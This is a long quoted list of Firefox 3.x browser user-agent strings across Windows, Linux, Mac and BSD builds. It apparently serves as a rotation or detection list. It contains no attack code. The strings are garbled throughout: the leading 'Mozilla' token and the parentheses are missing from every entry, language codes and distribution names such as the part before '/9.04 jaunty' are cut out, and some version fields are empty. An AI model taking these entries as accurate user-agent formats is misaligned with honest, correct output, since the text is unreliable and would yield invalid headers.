	"/5.0 Windows; U; Windows NT 5.2; zh-CN; rv:1.9.1.5 Gecko/Firefox/3.5.5"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.5 Gecko/20091102 MRA 5.5  02842 Firefox/3.5.5 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.5 Gecko/20091102 MRA 5.5  02842 Firefox/3.5.5"
	"/5.0 Windows NT 5.1; U; zh-; rv:1.8.1 Gecko/20091102 Firefox/3.5.5"
	"/5.0 Macintosh; U; Intel Mac OS X 10.5; pl; rv:1.9.1.5 Gecko/20091102 Firefox/3.5.5 FBSMTWB"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.1.4 Gecko/20091016 SUSE/3.5.4-1.1.2 Firefox/3.5.4"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.4 Gecko/20091016 Firefox/3.5.4 .NET CLR 3.5.30729 FBSMTWB"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.4 Gecko/20091007 Firefox/3.5.4"
	"/5.0 Windows; U; Windows NT 5.1; -RU; rv:1.9.1.4 Gecko/20091016 Firefox/3.5.4 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.9.1.4 Gecko/20091016 Firefox/3.5.4  .NET CLR 3.5.30729; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1.4 Gecko/20091007 Firefox/3.5.4"
	"/4.0 Windows; U; Windows NT 6.0; -US; rv:1.9.2.2 Gecko/2010324480 Firefox/3.5.4"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.1.5 Gecko/20091109 /9.10 karmic Firefox/"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090914 /13.0_stable Firefox/3.5.3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.3 Gecko/20091020 /9.10 karmic Firefox/3.5.3"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.3 Gecko/20090919 Firefox/3.5.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.3 Gecko/20090912 Gentoo Firefox/3.5.3 FirePHP/0.3"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 GTB5"
	"/5.0 X11; U; FreeBSD i386; -RU; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; zh-CN; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; fr; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2.3 Gecko/20100401 Firefox/3.5.3;MEGAUPLOAD 1.0  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; -DE; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.0; ko; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; fi; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727; .NET CLR 3.0.30618; .NET CLR 3.5.21022; .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; ko; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; pl; rv:1.9.1.2 Gecko/20090911  Firefox/3.5.2"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.2 Gecko/20090803  Firefox/3.5.2"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.2 Gecko/20090803 Firefox/3.5.2 "
	"/5.0 X11; U; Linux i686; -RU; rv:1.9.1.2 Gecko/20090804 Firefox/3.5.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.2 Gecko/20090729 /13.0 Firefox/3.5.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2"
	"/5.0 X11; U; Linux i686 x86_64; fr; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2"
	"/5.0 Windows; U; Windows NT 6.1; zh-CN; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -GB; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; pl; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2 GTB7.1  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; es-MX; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2"
	"/5.0 Windows; U; Windows NT 5.1; uk; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2"
	"/5.0 Windows; U; Windows NT 5.1; -BR; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2"
	"/5.0 Windows; U; Windows NT 5.1; es-ES; rv:1.9.1.2 Gecko/20090729 Firefox/3.5.2 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.16 Gecko/20101130 Firefox/3.5.16 FirePHP/0.4"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.16 Gecko/20101130 AskTbMYC/3.9.1.14019 Firefox/3.5.16"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.16 Gecko/20101130 Firefox/3.5.16 GTB7.1 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.1.16 Gecko/20101130 MRA 5.4  02647 Firefox/3.5.16  .NET CLR 3.5.30729; .NET4.0C"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.16 Gecko/20101130 Firefox/3.5.16 GTB7.1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.16 Gecko/20101130 AskTbPLTV5/3.8.0.12304 Firefox/3.5.16 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.9.1.16 Gecko/20101130 Firefox/3.5.16 GTB7.1 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.9.1.16 Gecko/20101130 Firefox/3.5.16 GTB7.1"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.1.15 Gecko/20101027 /3.5.15-1.fc12 Firefox/3.5.15"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.1.15 Gecko/20101027 /3.5.15-1.fc12 Firefox/3.5.15"
	"/5.0 Windows; U; Windows NT 5.0; ; rv:1.9.1.13 Gecko/20100914 Firefox/3.5.13"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.0.12 Gecko/2009070611 Firefox/3.5.12"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1.12 Gecko/20100824 MRA 5.7  03755 Firefox/3.5.12"
	"/5.0 X11; U; Linux; -US; rv:1.9.1.11 Gecko/20100720 Firefox/3.5.11"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.11 Gecko/20100701 Firefox/3.5.11  .NET CLR 3.5.30729; .NET4.0C"
	"/5.0 Windows; U; Windows NT 5.1; -BR; rv:1.9.1.11 Gecko/20100701 Firefox/3.5.11  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1.11 Gecko/20100701 Firefox/3.5.11"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.1.10 Gecko/20100504 Firefox/3.5.11 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.1.10 Gecko/20100506 SUSE/3.5.10-0.1.1 Firefox/3.5.10"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.1.10 Gecko/20100504 Firefox/3.5.10 GTB7.0  .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; rv:1.9.1.1 Gecko/20090716 Linux Firefox/3.5.1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.3 Gecko/20100524 Firefox/3.5.1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090716 Linux /7  Firefox/3.5.1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090716 Firefox/3.5.1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1"
	"/5.0 X11; U; Linux x86; rv:1.9.1.1 Gecko/20090716 Linux Firefox/3.5.1"
	"/5.0 X11; U; Linux i686; nl; rv:1.9.1.1 Gecko/20090715 Firefox/3.5.1"
	"/5.0 X11; U; Linux i686; nl-NL; rv:1.9.0.19 Gecko/20090720 Firefox/3.5.1"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20090729 /9.04 jaunty Firefox/3.5.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.1 Gecko/20090715 Firefox/3.5.1 GTB5"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.1 Gecko/20090722 Gentoo Firefox/3.5.1"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1.1 Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1"
	"/5.0 X11; U; DragonFly i386; ; rv:1.9.1 Gecko/20090720 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.1 Gecko/20090715 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 6.0; tr; rv:1.9.1.1 Gecko/20090715 Firefox/3.5.1 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1.1 Gecko/20090715 Firefox/3.5.1 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.1 Gecko/20090715 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.1.1 Gecko/20090715 Firefox/3.5.1 GTB5 .NET CLR 4.0.20506"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.1.1 Gecko/20090715 Firefox/3.5.1 GTB5 .NET CLR 3.5.30729"
	"/5.0 X11;U; Linux i686; -GB; rv:1.9.1 Gecko/20090624 /9.04 jaunty Firefox/3.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1 Gecko/20090630 Firefox/3.5 GTB6"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1 Gecko/20090624 Firefox/3.5 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux i686; -IT; rv:1.9.0.2 Gecko/2008092313 /9.04 jaunty Firefox/3.5"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.1 Gecko/20090624 Firefox/3.5"
	"/5.0 X11; U; Linux i686; fr-FR; rv:1.9.1 Gecko/20090624 /9.04 jaunty Firefox/3.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1 Gecko/20090701 /9.04 jaunty Firefox/3.5"
	"/5.0 X11; U; Linux i686; -us; rv:1.9.0.2 Gecko/2008092313 /9.04 jaunty Firefox/3.5"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1 Gecko/20090624 /8.04 hardy Firefox/3.5"
	"/5.0 X11; U; Linux i686; ; rv:1.9.1 Gecko/20090624 Firefox/3.5"
	"/5.0 X11; U; Linux i686 x86_64; ; rv:1.9.1 Gecko/20090624 Firefox/3.5"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.9.1 Gecko/20090703 Firefox/3.5"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.9.0.10 Gecko/20090624 Firefox/3.5"
	"/5.0 Windows; U; Windows NT 6.1; pl; rv:1.9.1 Gecko/20090624 Firefox/3.5 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; es-ES; rv:1.9.1 Gecko/20090624 Firefox/3.5 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1 Gecko/20090612 Firefox/3.5 .NET CLR 4.0.20506"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1 Gecko/20090612 Firefox/3.5"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1 Gecko/20090624 Firefox/3.5 .NET CLR 4.0.20506"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1 Gecko/20090624 Firefox/3.5"
	"/5.0 Windows; U; Windows NT 6.0; zh-TW; rv:1.9.1 Gecko/20090624 Firefox/3.5 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv: Gecko/20090105 Firefox/"
	"/5.0 Macintosh; U; Intel Mac OS X 10.5; -US; rv: Gecko/20090204 Firefox/"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1b3 Gecko/20090327 /3.1-0.11.beta3.fc11 Firefox/3.1b3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1b3 Gecko/20090312 Firefox/3.1b3"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1b3 Gecko/20090407 Firefox/3.1b3"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3"
	"/5.0 Windows; U; Windows NT 6.1; pl; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3 GTB5 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1 Gecko/20090624 Firefox/3.1b3;MEGAUPLOAD 1.0 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -GB; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3 GTB5 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -GB; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3"
	"/5.0 Windows; U; Windows NT 6.0; fr; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3"
	"/5.0 Windows; U; Windows NT 6.0; es-AR; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.1b3 Gecko/20090405 Firefox/3.1b3"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3"
	"/5.0 Windows; U; Windows NT 5.1; nl; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.9.1b3 Gecko/20090305 Firefox/3.1b3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; x64; -US; rv: Gecko/20081026 Firefox/"
	"/5.0 Windows; U; Windows NT 6.0 x64; -US; rv: Gecko/20081026 Firefox/"
	"/5.0 Windows; U; Windows NT 6.0 ; x64; -US; rv: Gecko/20081026 Firefox/"
	"/5.0 Windows; U; Windows NT 5.1 ; x64; -US; rv: Gecko/20081026 Firefox/"
	"/5.0 X11; U; DragonFly i386; ; rv:1.9.1b2 Gecko/20081201 Firefox/3.1b2"
	"/5.0 Windows; U; Windows NT 6.1; -AT; rv:1.9.1b2 Gecko/20081201 Firefox/3.1b2"
	"/5.0 Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1b2 Gecko/20081201 Firefox/3.1b2"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1b2 Gecko/20081201 Firefox/3.1b2"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.1b2 Gecko/20081201 Firefox/3.1b2"
	"/5.0 Windows; U; Windows NT 6.0; -AT; rv:1.9.1b2 Gecko/20081201 Firefox/3.1b2"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1b2 Gecko/20081201 Firefox/3.1b2"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.1b2 Gecko/20081201 Firefox/3.1b2"
	"/5.0 Macintosh; U; Intel Mac OS X 10.5; ko; rv:1.9.1b2 Gecko/20081201 Firefox/3.1b2"
	"/5.0 Windows; U; Windows NT 6.0; fr; rv:1.9.1b1 Gecko/20081007 Firefox/3.1b1"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.1b2 Gecko/20081127 Firefox/3.1b1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008092313 /8.04 hardy Firefox/3.1.6"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.9.0.2 Gecko/2008092313 Firefox/3.1.6"
	"/4.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2.7 Gecko/2008398325 Firefox/3.1.4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1b3 Gecko/20090327 GNU/Linux/x86_64 Firefox/3.1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.2 Gecko/2008092313 /8.04 hardy Firefox/3.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008092313 /8.04 hardy Firefox/3.1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/2009011606 Firefox/3.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.16 Gecko/20080716 Firefox/3.07"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.0.8 Gecko/2009032609 Firefox/3.07"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.03"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/2008040318 Firefox/ Swiftfox"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/2008030706 Firefox/"
	"/5.0 X11; U; SunOS ; -US; rv:1.9b5 Gecko/2008032620 Firefox/3.0b5"
	"/5.0 X11; U; Linux x86_64; -BR; rv:1.9b5 Gecko/2008041515 Firefox/3.0b5"
	"/5.0 X11; U; Linux x86_64; -US; rv: Gecko/2008042312 Firefox/3.0b5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9b5 Gecko/2008041816 /3.0-0.55.beta5.fc9 Firefox/3.0b5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9b5 Gecko/2008040514 Firefox/3.0b5"
	"/5.0 X11; U; Linux i686; tr-TR; rv:1.9b5 Gecko/2008032600 SUSE/2.9.95-25.1 Firefox/3.0b5"
	"/5.0 X11; U; Linux i686; ; rv:1.9b5 Gecko/2008032600 SUSE/2.9.95-25.1 Firefox/3.0b5"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9b5 Gecko/2008050509 Firefox/3.0b5"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.9b5 Gecko/2008041514 Firefox/3.0b5"
	"/5.0 X11; U; Linux i686; -US; rv:1.9b5 Gecko/2008050509 Firefox/3.0b5"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9b5 Gecko/2008041514 Firefox/3.0b5"
	"/5.0 X11; U; Linux i686; ; rv:1.9b5 Gecko/2008050509 Firefox/3.0b5"
	"/5.0 X11; U; Linux i686; ; rv:1.9b5 Gecko/2008041514 Firefox/3.0b5"
	"/5.0 Windows; U; Windows NT 6.0; fr; rv:1.9b5 Gecko/2008032620 Firefox/3.0b5"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9b5 Gecko/2008032620 Firefox/3.0b5"
	"/5.0 Windows; U; Windows NT 5.2; nl; rv:1.9b5 Gecko/2008032620 Firefox/3.0b5"
	"/5.0 Windows; U; Windows NT 5.2; fr; rv:1.9b5 Gecko/2008032620 Firefox/3.0b5"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9b5 Gecko/2008032620 Firefox/3.0b5"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.9b5 Gecko/2008032620 Firefox/3.0b5"
	"/5.0 Macintosh; U; PPC Mac OS X 10.4; -GB; rv:1.9b5 Gecko/2008032619 Firefox/3.0b5"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/2008021714 Firefox/ Swiftfox"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/2008021712 Firefox/ Swiftfox"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/2008020708 Firefox/"
	"/5.0 X11; U; Windows NT 5.0; -US; rv:1.9b4 Gecko/2008030318 Firefox/3.0b4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9b4 Gecko/2008040813 Firefox/3.0b4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9b4 Gecko/2008031318 Firefox/3.0b4"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9b4 Gecko/2008030800 SUSE/2.9.94-4.2 Firefox/3.0b4"
	"/5.0 X11; U; Linux i686; -US; rv:1.9b4 Gecko/2008031317 Firefox/3.0b4"
	"/5.0 Windows; U; Windows NT 6.0; pl; rv:1.9b4 Gecko/2008030714 Firefox/3.0b4"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW; rv:1.9b4 Gecko/2008030714 Firefox/3.0b4"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.9b4 Gecko/2008030714 Firefox/3.0b4"
	"/5.0 Windows; U; Windows NT 5.1; nl; rv:1.9b4 Gecko/2008030714 Firefox/3.0b4"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9b4 Gecko/2008030714 Firefox/3.0b4"
	"/5.0 Macintosh; U; Intel Mac OS X 10.5; ; rv:1.9b4 Gecko/2008030317 Firefox/3.0b4"
	"/5.0 X11; U; Linux x86_64; -US; rv: Gecko/2008020509 Firefox/"
	"/5.0 X11; U; Linux x86_64; -US; rv: Gecko/2008011321 Firefox/"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/2008020507 Firefox/"
	"/5.0 X11; U; Linux i686; -US; rv:1.9b3 Gecko/2008020513 Firefox/3.0b3"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9b3 Gecko/2008020514 Firefox/3.0b3"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.9b3 Gecko/2008020514 Firefox/3.0b3"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9b3 Gecko/2008020514 Firefox/3.0b3"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9b3 Gecko/2008020514 Firefox/3.0b3"
	"/5.0 X11; U; Linux i686; -US; rv:1.9b2 Gecko/2007121016 Firefox/3.0b2"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.9b2 Gecko/2007121016 Firefox/3.0b2"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9b2 Gecko/2007121120 Firefox/3.0b2"
	"/5.0 Windows; U; Windows NT 5.1; es-AR; rv:1.9b2 Gecko/2007121120 Firefox/3.0b2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9b1 Gecko/2007110703 Firefox/3.0b1"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/2008010415 Firefox/3.0b"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.9a2 Gecko/20080530 Firefox/3.0a2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9a1 Gecko/20060814 Firefox/3.0a1"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.9a1 Gecko/20061204 Firefox/3.0a1"
	"/5.0 Macintosh; I; PPC Mac OS X Mach-O; -US; rv:1.9a1 Gecko/20061204 Firefox/3.0a1"
	"/6.0 Windows; U; Windows NT 7.0; -US; rv:1.9.0.8 Gecko/2009032609 Firefox/3.0.9 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.0.9 Gecko/2009042114 /9.04 jaunty Firefox/3.0.9"
	"/5.0 X11; U; Linux x86_64; es-ES; rv:1.9.0.9 Gecko/2009042114 /9.04 jaunty Firefox/3.0.9"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.9 Gecko/2009042113 /8.10  Firefox/3.0.9"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.9 Gecko/2009042114 /9.04 jaunty Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.9 Gecko/2009042113 /8.10  Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.7 Gecko/2009030422 /8.10  Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.9 Gecko/2009042113 /9.04 jaunty Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.9 Gecko/2009042113 /8.04 hardy Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; fi-FI; rv:1.9.0.9 Gecko/2009042113 /9.04 jaunty Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.9.0.9 Gecko/2009042113 /9.04 jaunty Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.9 Gecko/2009042113 /8.10  Firefox/3.0.9 GTB5"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.9 Gecko/2009042113 Linux /6  Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.9 Gecko/2009041408  /3.0.9-1.el5 Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.9 Gecko/2009040820 Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.9 Gecko/2009042113 /9.04 jaunty Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.9 Gecko/2009042113 /8.10  Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.9 Gecko/2009042113 /8.04 hardy Firefox/3.0.9"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.9 Gecko/2009041500 SUSE/3.0.9-2.2 Firefox/3.0.9"
	"/5.0 Windows; U; Windows NT 6.1; nl; rv:1.9.0.9 Gecko/2009040821 Firefox/3.0.9 FirePHP/0.3"
	"/5.0 Windows; U;  Windows NT 5.1; ; rv:1.9.0.4 Firefox/3.0.8"
	"/6.0 Windows; U; Windows NT 6.0; -US; rv:1.9.0.8 Gecko/2009032609 Firefox/3.0.8 .NET CLR 3.5.30729"
	"/6.0 Windows; U; Windows NT 6.0; -US; rv:1.9.0.8 Gecko/2009032609 Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; zh-TW; rv:1.9.0.8 Gecko/2009032712 /8.04 hardy Firefox/3.0.8 GTB5"
	"/5.0 X11; U; Linux x86_64; nb-NO; rv:1.9.0.8 Gecko/2009032600 SUSE/3.0.8-1.2 Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.8 Gecko/2009033100 /9.04 jaunty Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.8 Gecko/2009032712 /8.10  Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; fi-FI; rv:1.9.0.8 Gecko/2009032712 /8.10  Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.8 Gecko/2009040312 Gentoo Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.8 Gecko/2009033100 /9.04 jaunty Firefox/3.0.8"
